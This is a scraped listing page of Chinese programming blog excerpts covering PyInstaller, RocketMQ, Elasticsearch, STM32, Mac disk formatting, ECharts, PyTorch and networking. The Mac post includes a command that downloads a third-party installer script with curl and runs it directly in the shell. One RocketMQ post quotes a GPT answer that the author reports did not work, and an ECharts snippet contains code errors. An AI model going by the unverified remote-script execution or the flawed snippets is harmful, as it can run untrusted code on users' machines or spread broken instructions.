在这里，我们介绍多文件打包：Pyinstaller将多个py文件打包为一个exe文件和其他的依赖。Pyinstaller有很多不同的命令选项用于自定义打包的过程（更多细节可以在官方文档查看：https://pyinstaller.org/en/stable/index.html）： pyinstaller options.. myscript.py 运行上述命令后，首先会产生一个.spec文件，即规范化文件：它会告知Pyinstaller如何对你的script进行打包。它编码了你的script name和你给出的命令选项options。spec文件实际上是可执行的Python代码。PyInstaller通过执行spec文件的内容来构建应用程序。以下是spec文件的内容： # -*- mode: python ; coding: utf-8 -*- block_cipher = None #设置 加密，需要安装tinyaes第三方库，最多16位字符，此处在使用--key= 会有变化 a = Analysis( ['main.py'], # 运行的所有py文件，包括依赖的py文件 pathex=[], # 搜索导入的路径列表（此列表为项目绝对路径)，包括选项给出的路径--paths，项目需要从什么地方导入自定义库 binaries=[], # 脚本需要的非python模块，包括--add-binary选项给出的名称，二进制数据 datas=[], # 应用程序中包含的非二进制文件，包括--add-data选项给出的名称，项目需要用到什么数据，比如图片，视频等。里面格式为tuple，第一个参数是文件路径，第二个是打包后所在的路径，其为一个元组：('image/*.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7296369235371ae40f670b10470db741/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6b11614d0e0a685289853c2ba2a06974/" rel="bookmark">
			Adjusted frame length exceeds 1677216:16777318-discarded
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题背景 消息队列的nameser和broker运行后，在console无法显示，进入broker.log，namesrv.log 显示如下报错Adjusted frame length exceeds 1677216:16777318-discarded
问题原因 经定位，rocketmq底层集群间使用netty通信，rocketmq在过去的使用中创建了大量的topic以及消费组（代码逻辑是根据时间戳去每次生成新的消费组），这一数据量不断增长，达到netty阈值，导致无法通信
GPT解释（实测无效，需要修改bin/runserver.sh bin/runbroker.sh而不是broker.conf） com.rocketmq.remoting.frameMaxLength 是 RocketMQ 中的一个属性，用于配置消息传输的最大帧长度。每个消息在传输过程中都会被拆分成多个帧进行传输，该属性用于限制每个帧的最大长度。
要配置 com.rocketmq.remoting.frameMaxLength，你需要编辑 RocketMQ 的配置文件，具体取决于你是使用 Apache RocketMQ 还是 Alibaba RocketMQ。
对于 Apache RocketMQ，你需要编辑 conf/broker.conf（Broker 配置文件）或者 conf/namesrv.conf（NameServer 配置文件），在文件中添加如下配置：
com.rocketmq.remoting.frameMaxLength=xxxx 其中，xxxx 是你希望设置的最大帧长度，单位是字节。
对于 Alibaba RocketMQ，你需要编辑 conf/2m-2s-sync/broker-a.properties（Broker 配置文件）或者 conf/namesrv.properties（NameServer 配置文件），在文件中添加如下配置：
com.rocketmq.remoting.frameMaxLength=xxxx 同样，xxxx 是你想要设置的最大帧长度，以字节为单位。
配置完成后，保存文件并重新启动 RocketMQ 以使配置生效。请注意，修改配置文件可能需要管理员权限。
需要注意的是，com.rocketmq.remoting.frameMaxLength 的默认值是 4MB（4194304 字节），如果你的消息超过这个长度，你可能需要增加该值以支持更大的消息。然而，增加最大帧长度也会增加网络传输的负载和延迟，因此需要根据实际情况进行权衡和调整。
临时解决方案 在rocketmq的bin目录下修改配置
在bin/runserver.sh bin/runbroker.sh加上一行： JAVA_OPT="${JAVA_OPT} -Dcom.rocketmq.remoting.frameMaxLength=33554432 重启集群后生效
永久解决方案 修改topic和消费组的生成策略，定期清除
参考文档 https://blog.csdn.net/xxxzzzqqq_/article/details/130102465
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5c1b04bf941e99c19ab6492e8e957162/" rel="bookmark">
			简单讲讲ES在大数据规模下的性能问题与解决方案（一）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		众所周知，在处理大规模数据量的时候，我们的传统关系型数据库，例如MySQL，Oracle等...它们对于这些大规模数据的处理与计算是非常吃力的，甚至于在内存资源不足的情况下导致在mysql中查询数据失败的情况，甚至由于数据的规模较大，会消耗更多的磁盘空间，得不偿失。因此便有了非关系数据库NoSql的概念。在处理大规模数据集中常用的NoSql数据库有Redis，Hbase，ES等。它们都是非关系型数据库，都是以K-V的形式存储数据，在查询的时候，可以通过key来精确命中需要的value。而使用这些非关系型数据库的目的第一点是节省数据在磁盘上的存储，第二点是达到p99 latency小于200ms的目标。 ElasticSearch在非关系型数据库中，是当下比较受欢迎的存在，因为其完全基于内存计算，它的倒排索引机制，结合云服务实现的”zstd“压缩算法，以及它本身具备的”best_compress“压缩算法，都让其成为当下公司选择大规模数据处理和查询工具的香饽饽。本文主要简单介绍以下ES在处理大规模数据场景下遇到的性能问题以及解决方案。后续会持续更新这个系列。
当数据量特别大时，Elasticsearch（ES）可能会面临以下一些问题：
存储需求：大规模存储数据可能需要大量的硬盘空间。你需要确保你的硬件能够满足存储需求，并且有足够的扩展性。
索引效率：随着数据量的增加，索引的创建和更新可能变得更加耗时。ES使用倒排索引来加快搜索速度，但在大规模数据集上创建和维护索引可能需要更多的时间和资源。
查询性能：当数据量增加时，查询性能可能受到影响。根据查询的复杂性和数据量的大小，查询可能需要更长的时间来执行。你可以通过优化查询、增加硬件资源或使用分布式架构来提高查询性能。
集群管理：大规模数据集通常需要使用ES的分布式特性，使用多个节点组成集群。这涉及到节点之间的协调和数据分片，对集群的管理和配置要求更高。
硬件要求：大规模数据集可能需要更多的硬件资源来支持。你需要评估并确保你的硬件（包括CPU、内存、磁盘和网络带宽）能够满足需求。
备份和恢复：对大规模数据集进行备份和恢复可能需要更长的时间和更大的存储空间。你需要有合适的备份策略和恢复计划。
那么如何解决es在存储的数据量过大的情况下，查询性能下降的问题。并且可以让es一贯保持毫秒级别的查询速度呢？
硬件升级：
例子：升级服务器的CPU和内存。例如，将4核CPU升级到8核，内存从16GB升级到32GB，这样可以提供更好的处理能力和容量，以应对大规模查询负载。 分片和副本设置：
例子：对于大型索引，可以增加分片数量以实现更好的负载均衡和查询吞吐量。例如，将原先的索引分成20个分片，每个分片存储部分数据，并行处理查询请求。例子：合理设置副本数，将副本分布在不同的节点上以提高查询的并行性和可用性。例如，将副本数设置为2，并确保每个主分片有一个副本分片位于不同的节点上。 索引设计优化：
例子：选择正确的字段类型和分词器以减少不必要的计算和提高查询速度。例如，对于英文文本字段，可以使用text类型和适当的分词器进行全文搜索，对于精确匹配字段，可以使用keyword类型。例子：优化映射以减少冗余数据量和索引大小。例如，对于不需要进行全文搜索的字段，可以将其设置为不被索引的no字段。例子：调整倒排索引以减少查询的范围。例如，在高基数字段上使用布隆过滤器来快速确定某个术语是否存在于倒排索引中。 查询缓存：
例子：使用ES的查询缓存来缓存常用查询的结果，避免重复计算。例如，通过启用查询缓存配置，在查询频率较高且数据更新频率较低的场景下，可以显著提高查询速度。 搜索优化：
例子：使用过滤器替代全文搜索来减小查询范围和复杂度。例如，对于某些字段，可以使用term或terms查询进行精确匹配而不进行全文搜索。例子：使用布尔查询来组合多个查询条件，避免使用复杂的查询字符串或查询语句。例如，使用bool查询来组合term查询和range查询。 聚合查询优化：
例子：减少聚合查询中的字段数量，只选择必要的字段进行聚合操作。例如，对于某个日期字段，只选择需要统计的日期范围，而不是整个索引的日期范围。例子：根据需求选择合适的聚合类型。例如，对于需要统计字段的总和，可以使用sum聚合；对于需要统计字段的平均值，可以使用avg聚合。 查询优化工具：
例子：使用Explain API来分析查询的执行过程，查看查询的得分、倒排列表等信息，以确定查询性能的瓶颈所在。例子：使用Profile API来分析查询的性能开销，并找到需要优化的查询部分。例子：使用Index Stats等API来监控索引的性能指标，如查询次数、缓存命中率等，以便及时调整和优化。 缓存和预热：
例子：将常用数据存储在其他缓存层（如Redis）中，避免频繁访问ES。例如，将热门商品的信息缓存到Redis中，直接从缓存中获取数据而不是每次都查询ES。例子：在系统启动时预热缓存，提前加载常用数据到缓存中，以避免首次查询的冷启动延迟。 分布式架构：
例子：使用ES的集群和节点来分布式存储和处理数据。通过添加更多的节点来横向扩展集群的查询能力，以提高查询吞吐量。例子：使用基于分片的并行查询来利用集群中的多个节点进行查询处理。例如，将查询请求分发到不同的节点上，并行执行查询以加快查询速度。 通过综合应用这些详细的解决方案，可以有效地提升Elasticsearch在大数据量下的查询性能，并保持毫秒级别的查询速度。需要根据具体场景和需求选择合适的优化方案进行实施。
点个关注不迷路， 后续会持续更新这些非关系型数据库的应用以及查询场景和优化内容的哦！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/04106bb6341eac36f92f310ffe21574d/" rel="bookmark">
			stm32_断点调试无法进入串口接收中断
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		先说结果，可能是stm32调试功能/keil软件/调试器（试过STLINK和JLINK两种）的问题，不是代码；
1、入坑 配置完串口后，可以发送数据到串口助手，但不能接收数据并做处理，所以第一步，想确定有没有接收到单个字节进入中断。
开始打断点调试，发现串口数据寄存器DR能收到数据，串口状态寄存器SR也有标志的变化，但就是进不了中断服务函数的判断，反复检查配置、各种百度、直到替换为最简单的工程只保留串口，仍然不能解决。
2、串口状态寄存器 串口状态寄存器，显示了串口是否发送完成、接收到数据等，就是我们主要观察的寄存器。
3、具体现象 3.1、初始状态 断点打在判断是否收到数据的if语句，此时，状态寄存器SR=0xC0，未收到数据，数据寄存器DR=0x00;
3.2、进不去接收判断 通过串口助手发送0x01，状态寄存器SR=0xF0，表示收到数据RXNE=1，DR=0x01，收到数据和发送数据一致。
此时一切正常，理论上单步执行后，应该进入if的内容执行接收数据的操作，但是直接跳到了else，再看状态寄存器SR=0xC0，接收数据的标志没了RXNE=0，所以无法接收数据。
为什么RXNE标志位被清掉了呢？
看手册有两种情况，一是读数据寄存器，二是写0。
但是我们既没有去读DR，更没有写0，只是单步执行就自动被清掉了。
3.3、修改断点位置，正常进入接收 通过串口助手发送0x02，状态寄存器SR=0xF0，表示收到数据RXNE=1，DR=0x02，收到数据和发送数据一致，并且进入if判断内部，可正常接收数据。
4、反思 配置出问题，可第一时间从单个功能的工程入手，直接在现有代码上调试会有更多不确定的因素，更浪费时间精力。
不要太相信打断点调试，可能会有些代码不能正常执行，尤其是遇到和手册中描述不一致的地方，奇奇怪怪的时候。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ae52eea9522c77bf548053a3b471a682/" rel="bookmark">
			【Mac】mac 系统下格式化U盘或移动硬盘为ext4格式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 打开终端，安装 homebrew /bin/zsh -c "$(curl -fsSL https://gitee.com/cunkai/HomebrewCN/raw/master/Homebrew.sh)" 2. 安装之后再次运行此命令 /bin/zsh -c "$(curl -fsSL https://gitee.com/cunkai/HomebrewCN/raw/master/Homebrew.sh)" 3. 安装e2fsprogs brew install e2fsprogs 4. 查看所有硬盘分区 diskutil list /dev/disk0 (internal, physical): #: TYPE NAME SIZE IDENTIFIER 0: GUID_partition_scheme *251.0 GB disk0 1: Apple_APFS_ISC Container disk2 524.3 MB disk0s1 2: Apple_APFS Container disk3 245.1 GB disk0s2 3: Apple_APFS_Recovery Container disk1 5.4 GB disk0s3 /dev/disk3 (synthesized): #: TYPE NAME SIZE IDENTIFIER 0: APFS Container Scheme - +245.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ae52eea9522c77bf548053a3b471a682/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aa01acd642cd69b106738b3edbfe9b72/" rel="bookmark">
			秋招攻略！2023最全Java面试题目合集，看完卷死其他人
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这两年的面试难度确实要比往年高出很多。很多小伙伴投递了上千份简历，只有几家公司约面试。排除个人简历的因素，这在往年都是不太常见的。
大厂缩招，于是很多往年能进大厂的人只能去卷中小厂，搞得层层内卷。 比如往年能有一万个人能进大厂，今年大厂只招聘一千个，那另外九千个在往年有大厂水平的人就要去和水平相对普通一些的求职者争夺中小厂的名额了。而且，大厂不好过的话，中小厂也是一样的，甚至更惨。这就又导致很多中小厂的招聘同样减少了。
求职的人这么多，一个岗位这么多人竞争，当然要增加面试难度。于是乎，很多比较一般的公司，也对着底层原理疯狂问。
这个时候就有一些前几年已经参加过面试的人要说了：“哪一年不说今年是最难的啊，这抱怨难的人太矫情了”、“人不行，别怪路不平！”......。这些人不在少数，真是站着说话不腰疼啊！
正常来说，一个行业度过了几年红利期之后，大概率肯定是会走下坡路的。你想想，大家都知道这个行业赚钱，都想在这个行业分一杯羹，你说这个行业能不卷么！任何行业都逃不过这个命运。再加上疫情的因素，导致很多企业生存都比较困难，于是大规模裁员就来了。
或许只有那些真正经历了的，才能体会那些抱怨今年找工作难的人的心情。
我对现在所发生的的一切都不感到意外，事物发展的必然规律罢了，在国内尤其如此。找不到好工作除了抱怨招聘环境之外，还要审视一下自己的能力，想想自己是不是随大流进入了这个行业。多反思才能进步，不然在任何行业都难逃韭菜的命运。
另外，我们在准备面试的时候，要拿大厂的标准来要求自己。但是，在真正找工作的过程中，不要总是把目光放在大厂，一定要对自己的能力有一个清晰的认识。
为了帮助大家更好的面对面试，小编也准备一些java面试题，都是大厂真实考过的题目，也有详细的解答，需要完整文档的小伙伴可以前往文末自取~
一、JVM篇（2023）
（含：JVM类加载机制，JVM内存模型，垃圾收集机制，类字节码实现机制，JVM调优案例，GC日志详解等）
二、Java并发编程（2023）
（含：java内存模型，并发集合，线程池，阻塞队列，CAS与原子操作，无锁并发框架Disruptor等）
三、Spring篇（2023）
（含：spring IOC，spring AOP原理，spring 5，springMVC，事务管理，循环依赖，spring设计模式等）
四、Mysql篇（2023）
（含：SQL执行原理，索引底层机制，SQL执行计划分析，Mysql锁机制，Mysql事务隔离，SQL优化实践等）
五、SpringCloud篇（2023）
（含：服务发现与注册Eureka与Nacos，服务限流熔断降级Hystrix与Sentinel，分布式事务Seata，网关Gateway等）
六、Dubbo篇（2023）
（含：Dubbo基础，架构设计，集群，配置，通信协议，SPI等）
七、Redis篇（2023）
（含：Redis核心数据结构，Redis持久化机制与安全机制，哨兵与集群架构，Redis缓存穿透，缓存失效，缓存雪崩，Redis缓存设计与性能优化等）
八、分布式篇（2023）
（含：分布式架构原理，集群架构原理，分布式锁，分布式事务，分布式协议，分布式配置，海量数据分库分表，分布式调度，等）
九、设计模式篇（2023）
（含：单例模式，工厂模式，抽象工厂模式，建造者模式，原型模式，适配器模式，装饰器模式，代理模式等23种设计模式）
十、数据结构与算法篇（2023）
（含：红黑树，B+树，贪心算法，哈希分治法，七大查找算法，动态规划，一致性算法等）
十一、MQ篇（2023）
（含：消息丢失，消息重复消费，消息乱序，消息积压，延时队列，消息回溯消费，消息刷盘机制，MQ中间件集群架构原理等）
十二、Netty篇（2023）
（含：BIO、NIO及AIO线程模型，Netty线程模型，序列化协议protobuf，粘包拆包问题，Netty心跳机制，直接内存与Netty零拷贝，WebSocket协议等）
十三、Zookeeper篇（2023）
（含：ZooKeeper选举机制，ZooKeeper数据模型，ZooKeeper应用场景等）
十四、ElasticSearch篇（2023）
（含：ElasticSearch数据模型、ElasticSearch分布式架构、ElasticSearch数据读写原理和段合并等）
十五、网络与操作系统篇（2023）
（含：网络协议，TCP/IP系统结构，TCP/IP协议族，常见面试题，等）
文中资料已整理打包存放网盘，有需要完整版PDF的朋友可以点击下方的名片自取！
​
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/efc83e0ca21ff6dc03b7e26c1f36ef13/" rel="bookmark">
			【OpenCV常用函数：视频捕获函数】cv2.VideoCapture
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 文章目录 1、cv2.VideoCapture() 1、cv2.VideoCapture() 输入视频路径，创建VideoCapture的对象 cv2.VideoCapture(filename) filename: 视频文件的路径+视频名+扩展名 该类的函数有： 1）video.isOpened: 检查视频捕获是否成功
2）video.read(): 读取视频帧，返回ret, frame，ret为bool类型，表示是否成功
3）video.release(): 关闭视频
4）video.get(prop): 获取video的属性
如果要读取视频的每一帧，然后进行相关的处理时，可以通过以下代码实现： video = cv2.VideoCapture(video_path) while video.isOpened(): ret, frmae = video.read() if ret: # 对每一帧进行处理 else: video.release() 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3c73ee194bafbbb691f6ad5115bdec1e/" rel="bookmark">
			echarts实现中国地图下钻进入下一级行政区(地图钻取)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		获取geo数据： 可以使用node爬虫获取数据
最好多爬几遍，因为有时候会获取错误
实现逻辑 拥有geo数据后
请求geo数据注册地图 registerMap配置echarts增加事件监听（点击事件） 如果点击了，回到第一步。功能就是循环以上4步逻辑
echarts实现 html &lt;div ref="echarts-dom" class="echarts-content"&gt;&lt;/div&gt; js: export default { data() { return { mapChart: null, addressCode: [] }; }, mouted(){ this.mapChart = echarts.init(this.$refs["echarts-dom"]); this.getData(); }, methods: { getData("100000") { fetch(`${process.env.VUE_APP_ORIGIN}/geoData/${code}.json`) .then((res) =&gt; { return res.json(); }).then((res) =&gt; { this.addressCode = res.features; echarts.registerMap("echartsMap", res); this.setEchartsOptions(); }) .finally((err) =&gt; { this.mapLoading = false; }); }, // echarts配置 setEchartsOptions() { this.mapChart.off("click"); //图表渲染前销毁点击事件 this.mapChart.setOption({ series: [ { type: "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3c73ee194bafbbb691f6ad5115bdec1e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/18d170446f0386300a53b98276c6280a/" rel="bookmark">
			一款高性价比、入门级嵌入式国产CPU
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		关注+星标公众号，不错过精彩内容
作者 | strongerHuang
素材来源 | 全志、米尔官网
上个月有幸参加了电子展，和几位芯片原厂的朋友交流了当下的情况。这些年芯片太卷了，卷性能、卷工艺、卷价格······
我们谈到了一个关键的点，在恶劣的竞争中，要有自己“独有的特色”，才能走的长远。
今天就来聊聊全志的这么一款有特色的高性价比嵌入式处理器：T113-S3
全志嵌入式处理器T113
大概在10年前，因为用Linux做开发，我首次接触了全志的处理器。那个时候嵌入式领域大多都是国外大厂的处理器，全志的名气相对还不是很大。
因为全志的处理器有自己的一些特色，逐渐在国内有了一些名气，这里问下大家，你们知道或听说过全志的处理器吗？
1、T113处理器
今天聊的这款处理器T113是一款通用型的嵌入式CPU，也是一款具有一定特色的嵌入式CPU。
T113-S3 是全志科技在智能工控领域和汽车领域的一款高性价比、入门级嵌入式处理器。T113-S3处理器采用双核Cortex-A7、主频高达1.2GHz、支持视频编解码器、内置 128M DDR3。
此外还具备视频采集接口（Parallel-CSI/CVBS in）、显示器接口（MIPI-DSI/LVDS/RGB/CVBS out）、USB2.0 接口、CAN 接口、千兆以太网接口，因此特别适用于入门级工业人机界面(HMI)和具有视频功能的嵌入式设备等应用，适用于物联网网关、商业显示、能源电力、工业控制、医疗器械等场景。
2、米尔基于T113核心板
T113-S3核心板采用高密度高速电路板设计，在大小为37mm×39mm板卡上集成了T113-S3处理器、Nand Flash/eMMC、E2PROM、分立电源等电路。MYC-YT113X具有最严格的质量标准、超高性能、丰富外设资源、高性价比、长供货时间的特点，适用于高性能智能设备所需要的核心板要求。
T113-S3核心板定位工控领域，具备多方面优点：
5V供电，更好的兼容性，也更便利
更小的封装设计：37mm×39mm
带有屏蔽罩，使其稳定可靠
获得多方面认证：高低温、测试、CE、ROHS
3、米尔基于T113底板
米尔基于T113底板为满足不同用户的需求，提供了丰富的外设接口：
这是米尔官方提供的参数信息：
入门级处理器入门开发指南
虽然是入门级的嵌入式处理器，但入门还是需要掌握一些基础知识才行。
当然，处理器原厂，以及米尔开发板官方都提供了相应的开发指南，以及Demo软件。
为了方便开发者能够快速开发自己的应用，官方提供了移植好的系统，以及配套的SDK、各种开发和调试工具、应用开发例程等。
T113特别适用于入门级工业人机界面(HMI)和具有视频功能的嵌入式设备，这里给先大家看一段 Demo 演示视频：
当然，官方也考虑到了新手以及初学者，提供了保姆级的手把手教程，包括：
软硬件开发环境准备
使用 SDK 构建开发板镜像
烧录系统镜像
U-boot、Kernel等各种配置
Makefile、Qt等应用
具体细节内容，在购买开发板同时会提供相关的光盘资料，Linux 软件开发主要流程，也可以参看之前分享的文章《米尔基于D9软件开发流程》。
最后
全志T113-S3是一款【高性价比】的嵌入式处理器，双核A7，主频1.2GHz，片内128M内存，这CPU才20多元，你说香不香？
即便增加eMMC、EEPROM、电源等，封装成模组，价格也才几十块。
当然，主要还是看你需求，如果你正在寻找一款类似的芯片，不妨了解一下这款T113-S3核心板及开发板。
这里给出米尔基于T113-S3核心板及开发板的介绍：
https://www.myir.cn/shows/118/58.html
提示：公众号不支持外链接，请复制链接到浏览器打开，或者点击文末【阅读原文】了解更多。
米尔电子，专注嵌入式处理器模块设计和研发的高新技术企业，是领先的嵌入式处理器模组厂商。米尔电子在嵌入式处理器领域具有10多年的研发经验，为客户提供基于ARM架构、FPGA架构的CPU模组及充电控制系统等产品和服务；为智能医疗、智能交通、智能安防、物联网、边缘计算、工业网关、人工智能等行业客户，提供定制解决方案和OEM服务。公司通过专业高效的服务帮助客户加速产品上市进程，目前已为行业内10000家以上的企业客户服务。
米尔电子 领先的嵌入式处理器模块厂商
“米尔MYiR”公众号
☞不定期分享产品资料及干货
☞第一时间发布米尔最新资讯
长按二维码 关注我们
想要了解更多信息，欢迎联系我们
深圳总部电话：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/18d170446f0386300a53b98276c6280a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1ff5cb6d27ec6aa27ffbe7ff8e988e03/" rel="bookmark">
			PyTorch Lightning教程八：用模型预测，部署
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		关于Checkpoints的内容在教程2里已经有了详细的说明，在本节，需要用它来利用模型进行预测
加载checkpoint并预测 使用模型进行预测的最简单方法是使用LightningModule中的load_from_checkpoint加载权重。
model = LitModel.load_from_checkpoint("best_model.ckpt") model.eval() x = torch.randn(1, 64) with torch.no_grad(): y_hat = model(x) predict_step方法 加载检查点并进行预测仍然会在预测阶段的epoch留下许多boilerplate，LightningModule中的预测步骤删除了这个boilerplate 。
class MyModel(LightningModule): def predict_step(self, batch, batch_idx, dataloader_idx=0): return self(batch) 并将任何dataloader传递给Lightning Trainer
data_loader = DataLoader(...) model = MyModel() trainer = Trainer() predictions = trainer.predict(model, data_loader) 预测逻辑 当需要向数据添加复杂的预处理或后处理时，使用predict_step方法。例如，这里我们使用Monte Carlo Dropout 进行预测
class LitMCdropoutModel(pl.LightningModule): def __init__(self, model, mc_iteration): super().__init__() self.model = model self.dropout = nn.Dropout() self.mc_iteration = mc_iteration def predict_step(self, batch, batch_idx): # enable Monte Carlo Dropout self.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1ff5cb6d27ec6aa27ffbe7ff8e988e03/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/329cd95904770c4a0e7610e7c5559621/" rel="bookmark">
			机器学习参数调优
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		手动调参 分析影响模型的参数，设计步长进行交叉验证
我们以随机森林为例： 本文将使用sklearn自带的乳腺癌数据集，建立随机森林，并基于泛化误差（Genelization Error）与模型复杂度的关系来对模型进行调参，从而使模型获得更高的得分。
泛化误差是机器学习中，用来衡量模型在未知数据上的准确率的指标；
1、导入相关包 from sklearn.datasets import load_breast_cancer from sklearn.ensemble import RandomForestClassifier from sklearn.model_selection import cross_val_score from sklearn.model_selection import GridSearchCV import numpy as np import pandas as pd import matplotlib.pyplot as plt 2、导入乳腺癌数据集，建立模型 由于sklearn自带的数据集已经很工整了，所以无需做预处理，直接使用。
# 导入乳腺癌数据集 data = load_breast_cancer() # 建立随机森林 rfc = RandomForestClassifier(n_estimators=100, random_state=90) 用交叉验证计算得分 score_pre = cross_val_score(rfc, data.data, data.target, cv=10).mean() score_pre 3、调参 随机森林主要的参数有n_estimators（子树的数量）、max_depth（树的最大生长深度）、min_samples_leaf（叶子的最小样本数量）、min_samples_split(分支节点的最小样本数量）、max_features（最大选择特征数）。它们对随机森林模型复杂度的影响如下图所示：
n_estimators是影响程度最大的参数，我们先对其进行调整
# 调参，绘制学习曲线来调参n_estimators（对随机森林影响最大） score_lt = [] # 每隔10步建立一个随机森林，获得不同n_estimators的得分 for i in range(0,200,10): rfc = RandomForestClassifier(n_estimators=i+1 ,random_state=90) score = cross_val_score(rfc, data.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/329cd95904770c4a0e7610e7c5559621/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0dad14d512898f54757de99e5ae39392/" rel="bookmark">
			ubuntu 20.04 运行VINS-mono
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		参照解决cv_bridge和opencv之间版本匹配问题 - 知乎 (zhihu.com)
这种方式解决不了，试了N种方法
把虚拟机恢复回到了最初版本，发现原来在readme里面有一些依赖库忘记装，先装了pangolin
stevenlovegrove/Pangolin: Pangolin is a lightweight portable rapid development library for managing OpenGL display / interaction and abstracting video input. (github.com)
第一步下载安装pangolin，记得最后sudo make install
发现ch3中，siglot库有问题，实际上把cmakelists改成C++14就可以了
./visualizeGeometry: error while loading shared libraries: libpango_windowing.so: cannot open shared object file: No such file or directory
解决：sudo ldconfig
pcl库出问题，又是c++14的原因
然后把数据文件放到build当中可以成功运行
接下来尝试运行
sudo apt-get install ros-YOUR_DISTRO-cv-bridge ros-YOUR_DISTRO-tf ros-YOUR_DISTRO-message-filters ros-YOUR_DISTRO-image-transport
之前莫名其妙出现fatal error，原因居然是内存不够！！内存调成了8个G 但编译成功之后，执行过程调用第一个包一直报错，而且是不写原因的报错，应该还是OpenCV冲突的原因
放弃！！打算下载ubuntu16.04
最终解决方法 准备放弃之余，看到了这篇，属实是帮大忙了！！太感谢[替你踩遍坑]Ubuntu20.04+ROS Noetic+OPENCV3成功运行vins-fusion_ros noetic opencv_睡前救世主(￣_￣ )的博客-CSDN博客
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f63dacf65625efd98703d2b39c5673ff/" rel="bookmark">
			以太网Ethernet通信协议
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、以太网简介 计算机网络可分为局域网(LAN)、 城域网(MAN)、广域网(WAN)、互联网(Initernet)。局域网按传输介质所使用的访问控制方法可分为：以太网(Ethernet)、光纤分布式数据接口(FDDI)、异步传输模式(ATM)、令牌环网(Token Ring)、交换网(Switching) 等，它们在拓朴结构、传输介质、传输速率、数据格式等多方面都有许多不同，其中应用最广泛的当属以太网。
以太网协议（Ethernet Protocol）是一种广泛应用于局域网（LAN）和广域网（WAN）的计算机网络通信协议。它是一种基于共享介质的局域网技术，最早由Xerox、Intel和Digital Equipment Corporation（DEC）于1970年代开发，并在1980年代初由IEEE标准化为IEEE 802.3。以太网根据最大传输速率的不同可以分为标准的以太网(10Mbit/s)、快速以太网(100Mbit/s)、千兆以太网 (1000Mbit/s)和万兆以太网(10Gbit/s)。
二、计算机网络模型 为了实现网络通信的标准化，普及网络应用，国际标准化组织(ISO)将整个以太网通信结构制定了OSI(Open System Interconnection)模型。OSI定义了网络互连的七层框架(物理层、数据链路层、网络层、传输层、会话层表示层、应用层)，即OSI开放互连系统参考模型。每个层功能不同，网络通信中各司其职，整个模型包括硬件和软件定义。
在一定程度上参考了OSI模型后，产生了TCP/IP协议。TCP/IP (Transmission ControProtocol/Internet Protocol，传输控制协议/网际协议)是指能够在多个不同网络间实现信传输的协议簇。TCP/IP协议不仅仅指的TCP和IP两个协议，而是指一个由FTPSMTP、TCP、UDP、IP 等协议构成的协议簇， 只是因为在 TCP/P 协议中 TCP 协议和I协议最具代表性，所以被称为 TCP/IP 协议。
在TCP/IP协议中，OSI 七层参考模型被简化为五层。
在TCP/IP五层参考模型中，数据链路层又被分为LLC层(逻辑链路层)和MAC层(媒体介质访问层)。 LLC层和MAC层是软、硬件的分界线。如PC的网卡主要负责实现参考模型中的MAC子层和物理层。 之前写计算机网络的时候也写过相关博文：
Linux网络编程(一)_STATEABC的博客-CSDN博客
三、以太网传输格式 IEEE 802.3规定了以太网传输数据包的帧格式：前导码、帧起始界定符、帧头(目的MAC地址+源MAC地址+类型/长度)、数据、校验位。
